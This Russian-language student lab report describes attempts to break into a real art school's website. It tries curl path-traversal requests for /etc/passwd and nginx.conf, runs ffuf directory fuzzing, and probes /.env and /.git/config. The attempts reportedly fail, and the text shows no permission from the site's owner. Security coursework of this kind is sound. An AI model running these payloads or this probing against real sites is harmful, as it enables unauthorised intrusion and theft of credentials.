# Лабораторная работа №1 - со звёздочкой :star2:
![meme1](https://github.com/MkrtchyanKarina/DevOps_labs/blob/master/lab1_extra/img/meme1.jpg)

За основу мы взяли сайт [школы искусств](https://dshi46.ru/)
## Path traversal (обход пути)
*Уязвимость в веб-приложениях, позволяющая злоумышленнику получить несанкционированный доступ к файлам и директориям на сервере, находящимся за пределами разрешенного корневого каталога.*
1. Установим curl 
```
winget install curl.curl
```

2. Попытаемся сделать обход и получить доступ к системным файлам
```
curl -Uri "https://dshi46.ru/../../../../etc/passwd" | select -First 5
```
> Файл /etc/passwd содержит следующие записи, разделенные двоеточиями:
  > - Имя пользователя
  > - Зашифрованный пароль
  > - Цифровой идентификатор пользователя (UID)
  > - Цифровой идентификатор группы пользователя (GID)
  > - Полное имя пользователя (GECOS)
  > - Домашний каталог пользователя
  > - Оболочка входа в систему

![res1](https://github.com/MkrtchyanKarina/DevOps_labs/blob/master/lab1_extra/img/res1.png)

Попробуем закодировать символы ( %2f = / и, если сервер вдруг на Windows: %5c = \ ), а также получить файл с конфигурациями nginx
```
curl -Uri "https://dshi46.ru/..%2f..%2f..%2f..%2fetc%2fpasswd" | select -First 5
curl -Uri "https://dshi46.ru/..%5c..%5c..%5c..%5cetc%2fpasswd" | select -First 5
curl -Uri "https://dshi46.ru/..%2f..%2f..%2fetc%2fnginx%2fnginx.conf" | select -First 5
```

![res2](https://github.com/MkrtchyanKarina/DevOps_labs/blob/master/lab1_extra/img/res2.jpg)

Как видим, доступ получить не удалось :(

## FFUF
*мощный инструмент командной строки, предназначенный для перебора содержимого веб-приложений. Он позволяет автоматизировать процесс фаззинга, тем самым обнаруживая скрытые файлы и директории, а также проверяя различные параметры URL и заголовки HTTP.*
1. Скачаем релиз утилиты FFUF для Windows: ffuf_2.1.0_windows_amd64.zip
2. Извлечем ffuf.exe и переместим его в папку C:\Tools\
3. Добавим в переменные среды ( переменную Path ) путь до этой папки C:\Tools\
4. Перезапустим PowerShell
5. Скачаем [словарь для перебора](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/common.txt)
6. Выполним команду
   ```
   ffuf -w C:\Users\User\Downloads\common.txt -u https://dshi46.ru/FUZZ
   ```
7. В результате у нас есть доступ к странице для входа в аккаунт админа, но это не является уязимостью
8. А также на сервере существуют папки documents, stat и images к которым доступа нет
   ![res3](https://github.com/MkrtchyanKarina/DevOps_labs/blob/master/lab1_extra/img/res3.png)
9. С помощью команд
    ```
    ffuf -u https://dshi46.ru/stat/FUZZ -w "C:\Users\User\Downloads\common.txt" -mc 200,403 -t 10
    ffuf -u https://dshi46.ru/documents/FUZZ -w "C:\Users\User\Downloads\common.txt" -mc 200,403 -t 10
    ffuf -u https://dshi46.ru/documents/FUZZ -w "C:\Users\User\Downloads\common.txt" -mc 200,403 -t 10
    ```
    ![res4](https://github.com/MkrtchyanKarina/DevOps_labs/blob/master/lab1_extra/img/res4.png)
    
   проверили содержимое каталогов и код у файлов. Ничего лишнего вне рабочего каталога index нам не оказалось доступным.

## Раскрытие информации (Information Disclosure)
*Анализ HTTP-заголовков и проверка стандартных мест*
1. Проверим заголовки ответа
   ```
   curl -Uri "https://dshi46.ru/"
   ```
   ![res5](https://github.com/MkrtchyanKarina/DevOps_labs/blob/master/lab1_extra/img/res5.png)
2. Проверим служебные каталоги и файлы
   ```
   curl -Uri "https://dshi46.ru/nginx-status"
   curl -Uri "https://dshi46.ru/.env"        
   curl -Uri "https://dshi46.ru/.git/config"  
   curl -Uri "https://dshi46.ru/server-status"
   ```

   ![res6](https://github.com/MkrtchyanKarina/DevOps_labs/blob/master/lab1_extra/img/res6.png)

![meme2](https://github.com/MkrtchyanKarina/DevOps_labs/blob/master/lab1_extra/img/meme2.png)
